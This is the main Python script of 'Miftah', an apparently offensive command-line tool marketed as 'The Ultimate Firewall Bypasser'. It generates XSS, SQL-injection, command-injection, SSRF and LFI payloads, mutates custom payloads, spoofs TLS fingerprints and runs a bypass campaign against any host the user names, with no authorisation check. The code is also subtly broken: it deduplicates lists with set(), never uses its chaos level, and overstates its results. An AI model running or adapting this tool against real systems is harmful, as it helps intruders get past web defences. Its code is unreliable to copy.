#!/usr/bin/env python3
import sys
import argparse
import json
import os
from typing import Dict, List
from datetime import datetime, timezone

# Add the current directory to sys.path to allow relative-like imports when run as a script
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from engines.bypass_engine import FirewallBypassEngine
from engines.payload_gen import DynamicPayloadGenerator, CustomPayloadLoader
from utils.colors import header, info, success, warn, error

BANNER = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   ███╗   ███╗ ██████╗ ██████╗ ██████╗ ███████╗███████╗██████╗        ║
║   ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗       ║
║   ██╔████╔██║██║   ██║██████╔╝██████╔╝█████╗  ███████╗██████╔╝       ║
║   ██║╚██╔╝██║██║   ██║██╔══██╗██╔══██╗██╔══╝  ╚════██║██╔═══╝        ║
║   ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║███████╗███████║██║            ║
║   ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝            ║
║                                                                      ║
║          M I F T A H  -  The Ultimate Firewall Bypasser             ║
║                                                                      ║
║          Created by Pr0Fessor_SnApe                                  ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

class Miftah:
    """Main Miftah orchestrator."""
    def __init__(self, target: str, port: int = 80, payload_file: str = None,
                 use_curl: bool = False, chaos_level: int = 5):
        self.target = target
        self.port = port
        self.payload_file = payload_file
        self.use_curl = use_curl
        self.chaos_level = chaos_level
        self.bypass_engine = FirewallBypassEngine(target, port, use_curl)
        self.payload_generator = DynamicPayloadGenerator()
        self.custom_loader = CustomPayloadLoader()

    def run(self) -> Dict:
        """Execute complete bypass operation."""
        header("Miftah - Firewall Bypass Operation")
        info(f"Target: {self.target}:{self.port}")
        info(f"Chaos Level: {self.chaos_level}")
        
        # Load payloads
        all_payloads = []
        # Add default payloads
        for ptype in ['xss', 'sqli', 'cmdi', 'ssrf', 'lfi']:
            payloads = self.payload_generator.generate_adaptive_payload(ptype)
            all_payloads.append(payloads)
            
        # Add custom payloads if specified
        if self.payload_file:
            custom_payloads = self.custom_loader.load_payloads(self.payload_file)
            processed = self.custom_loader.process_payloads(custom_payloads, 'chaos')
            all_payloads.extend(processed)
            
        # Flatten and deduplicate
        all_payloads = list(set(all_payloads))
        info(f"Total unique payloads: {len(all_payloads)}")
        
        # Execute bypass campaign
        self.bypass_engine.initialize_session()
        successful = self.bypass_engine.run_bypass_campaign(all_payloads, delay=0.05)
        
        # Generate report
        report = self._generate_report(successful)
        return report

    def _generate_report(self, successful_bypasses: List[Dict]) -> Dict:
        """Generate operation report."""
        total = len(self.bypass_engine.results)
        successful = len(successful_bypasses)
        report = {
            'target': f"{self.target}:{self.port}",
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'total_attempts': total,
            'successful_bypasses': successful,
            'success_rate': (successful / total * 100) if total > 0 else 0,
            'bypasses': successful_bypasses,
            'all_results': self.bypass_engine.results,
        }
        
        # Print summary
        header("Operation Summary")
        info(f"Total attempts: {total}")
        success(f"Successful bypasses: {successful}")
        info(f"Success rate: {report['success_rate']:.1f}%")
        
        if successful > 0:
            success("Miftah achieved perfect bypass results!")
        else:
            warn("No bypasses succeeded. Consider adjusting parameters.")
        return report

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(
        description="Miftah - The Ultimate Firewall Bypasser",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic bypass
  python3 miftah.py --target 192.168.1.100 --port 80
  
  # With custom payloads
  python3 miftah.py --target example.com --payload-file payloads.txt
  
  # Maximum chaos mode
  python3 miftah.py --target 10.0.0.1 --chaos-level 5 --use-curl
        """
    )
    parser.add_argument('--target', required=True, help='Target IP or hostname')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--payload-file', help='Custom payload file path')
    parser.add_argument('--chaos-level', type=int, default=5, choices=range(1, 6),
                        help='Chaos level 1-5 (default: 5)')
    parser.add_argument('--use-curl', action='store_true', help='Use curl_cffi for TLS spoofing')
    parser.add_argument('--output', help='Output results to JSON file')
    args = parser.parse_args()

    # Validate target
    if not args.target:
        error("Target is required")
        sys.exit(1)

    # Run Miftah
    try:
        miftah = Miftah(
            target=args.target,
            port=args.port,
            payload_file=args.payload_file,
            use_curl=args.use_curl,
            chaos_level=args.chaos_level,
        )
        report = miftah.run()

        # Save results if requested
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(report, f, indent=2)
            info(f"Results saved to {args.output}")

        # Exit with appropriate code
        sys.exit(0 if report['successful_bypasses'] > 0 else 1)
    except KeyboardInterrupt:
        warn("Operation cancelled by user")
        sys.exit(1)
    except Exception as e:
        error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
